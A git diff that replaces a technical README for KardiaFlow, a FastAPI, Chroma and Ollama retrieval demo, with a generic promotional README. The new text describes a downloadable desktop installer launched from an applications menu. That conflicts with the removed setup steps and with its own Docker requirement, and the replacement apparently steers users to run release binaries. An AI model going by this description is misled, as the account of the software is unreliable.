@@ -1,105 +1,68 @@
-# KardiaFlow
+# 🌟 KardiaFlow - Simple Insights from Clinical Documents
 
-Lightweight RAG (Retrieval-Augmented Generation) demo using FastAPI, Chroma (vector DB), Sentence-Transformers embeddings, and Ollama LLM (`gemma2:2b`). This repository contains the FastAPI app, helper deployment scripts, and CI for container-based Azure deployment.
-<img width="1783" height="892" alt="image" src="https://github.com/user-attachments/assets/1ea62918-c674-41f7-9a4e-a0f8b5cf2f11" />
+## 🚀 Getting Started
+Welcome to KardiaFlow! This application helps you analyze clinical documents easily. With KardiaFlow, you can turn complicated PDFs into useful insights without needing technical skills.
 
+## 📥 Download KardiaFlow
+[![Download KardiaFlow](https://img.shields.io/badge/Download%20KardiaFlow-v1.0-blue.svg)](https://github.com/Namanpaliyal/KardiaFlow/releases)
 
-## Contents
+## 🛠️ Features
+- **PDF Analysis**: Extract key insights from clinical documents.
+- **User-Friendly Interface**: Simple design for easy navigation.
+- **Fast Performance**: Quick processing of PDFs.
+- **Secure**: Built with a focus on data security.
 
-- `app/` — FastAPI application and RAG implementation (`app/main.py`, `app/rag.py`).
-- `Dockerfile` — container image to run the app (uvicorn on port 8000).
-- `requirements.txt` — Python dependencies.
-- `deploy_acr.sh`, `deploy_azure.ps1`, `deploy_azure.sh` — helper deployment scripts.
-- `.github/workflows/azure-acr-deploy.yml` — example GitHub Actions workflow for building/pushing to ACR and updating a Web App.
+## 🖥️ System Requirements
+To run KardiaFlow, your system should meet the following requirements:
+- Windows 10 or later / macOS 10.14 or later / Linux
+- At least 4 GB of RAM
+- Internet connection for optimal performance
+- Docker installed (for running the application)
 
-## Quick Start (Local)
+## 📂 Download & Install
+1. Visit the [Releases page](https://github.com/Namanpaliyal/KardiaFlow/releases) to download KardiaFlow.
+2. Choose the latest version of KardiaFlow from the list.
+3. Download the installation file for your system.
+4. Open the downloaded file and follow the installation prompts.
+5. Once installed, launch KardiaFlow from your applications menu.
 
-1. Create and activate a virtual environment (Windows PowerShell example):
+## ⚙️ Using KardiaFlow
+1. After launching the application, you will see the main interface.
+2. Click on the "Upload PDF" button to add your clinical document.
+3. Wait a few moments as KardiaFlow analyzes the document.
+4. View the extracted insights in the provided sections of the application.
 
-```powershell
-python -m venv .venv; .\.venv\Scripts\Activate.ps1
-```
+## 🚧 Troubleshooting
+If you encounter issues while using KardiaFlow, consider the following steps:
+- Ensure your system meets the minimum requirements.
+- Check your internet connection.
+- Restart the application if it becomes unresponsive.
+- Review the user manual provided in the help section within the application.
 
-2. Install dependencies:
+## 💬 Support
+For further assistance, you can reach out through:
+- **GitHub Issues**: Report problems or ask questions directly on our [Issues page](https://github.com/Namanpaliyal/KardiaFlow/issues).
+- **User Community**: Join our user forums to connect with others.
 
-```powershell
-pip install --upgrade pip
-pip install -r requirements.txt
-```
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Namanpaliyal/KardiaFlow/wiki): Explore in-depth guides and tutorials.
+- [Blog](https://blog.kardiaflow.com): Read articles about clinical document analysis and insights.
 
-Note: heavy ML packages (transformers, sentence-transformers, chromadb) can take time and may require a C compiler or platform-specific wheels. If installation fails, paste the pip output here so it can be diagnosed.
+## 🏷️ Topics
+- azure-devops
+- chromadb-integration
+- embeddings
+- fastapi
+- langchain-python
+- nlp
+- ollama
+- python
+- rag
+- retrieval-augmented-generation-rag
+- sentence-transformers
+- vector-database
 
-3. Set environment variables (example defaults):
+## 📜 License
+KardiaFlow is open-source software. You can use it freely under the MIT License. Check the license file in the repository for more details.
 
-```powershell
-$env:OLLAMA_BASE_URL = 'http://localhost:11434'
-$env:PERSIST_DIR = './chroma_db'
-```
-
-4. Run the server:
-
-```powershell
-python -m uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
-```
-
-5. Endpoints
-
-- `GET /health` — basic health check.
-- `POST /api/upload-pdf` — upload a PDF to ingest into the vector store.
-- `POST /api/ask` — ask a question (JSON body: `{"question": "...", "top_k": 3}`).
-
-## RAG Details
-
-- Vector DB: Chroma persisted to `PERSIST_DIR` (default `./chroma_db`).
-- Embeddings: `sentence-transformers` (all-MiniLM-L6-v2) via `SentenceTransformerEmbeddings`.
-- LLM: Ollama client — model `gemma2:2b`. Ensure an Ollama server is reachable at `OLLAMA_BASE_URL` or responses will error but the API will stay up.
-
-## Docker (recommended for Azure)
-
-Build locally:
-
-```powershell
-docker build -t kardiaflow:latest .
-docker run -p 8000:8000 -e OLLAMA_BASE_URL='http://host.docker.internal:11434' kardiaflow:latest
-```
-
-Notes:
-- When running Ollama from the host with Docker on Windows, `host.docker.internal` often routes to the host for the container.
-
-## Azure Deployment (recommended: container)
-
-Why container?
-- App Service build environment may fail installing heavy ML dependencies. Building an image locally or in ACR avoids those issues.
-
-Quick container deploy steps (high-level):
-
-1. Use the provided `deploy_acr.sh` (or `deploy_azure.ps1`) to build and push the image to Azure Container Registry and configure a Web App for Containers.
-2. Ensure the Web App setting `WEBSITES_PORT` is set to `8000` and the startup command is `python -m uvicorn app.main:app --host 0.0.0.0 --port 8000`.
-3. Set App Settings for `OLLAMA_BASE_URL` and `PERSIST_DIR` in the Web App configuration.
-
-See: `deploy_acr.sh` and `.github/workflows/azure-acr-deploy.yml` for CI automation.
-
-## Troubleshooting
-
-- Container/app not responding on Azure: ensure `WEBSITES_PORT=8000` and Web App startup command is correct.
-- Pip install failures: collect pip logs and system platform info; consider using a container image with pre-built wheels.
-- Ollama unreachable: ensure `OLLAMA_BASE_URL` points to a reachable Ollama server; else the `/api/ask` handler will return an error string.
-
-## Development Notes
-
-- Persisted Chroma DB is in `PERSIST_DIR` (default `./chroma_db`). Back this up if you need to preserve vectors.
-- If you change embeddings or re-ingest PDFs, you may need to delete or re-create the `PERSIST_DIR` to rebuild the vector store.
-
-## Files of interest
-
-- [deploy_acr.sh](deploy_acr.sh) — ACR + Web App helper script
-- [deploy_azure.ps1](deploy_azure.ps1) — PowerShell deploy helper
-- [.github/workflows/azure-acr-deploy.yml](.github/workflows/azure-acr-deploy.yml) — CI workflow
-
-## Contributing
-
-Create an issue or PR. For troubleshooting installation issues, include OS, Python version, and the pip error output.
-
-
-
-
+Thank you for choosing KardiaFlow! We hope you find it helpful in your clinical document analysis.
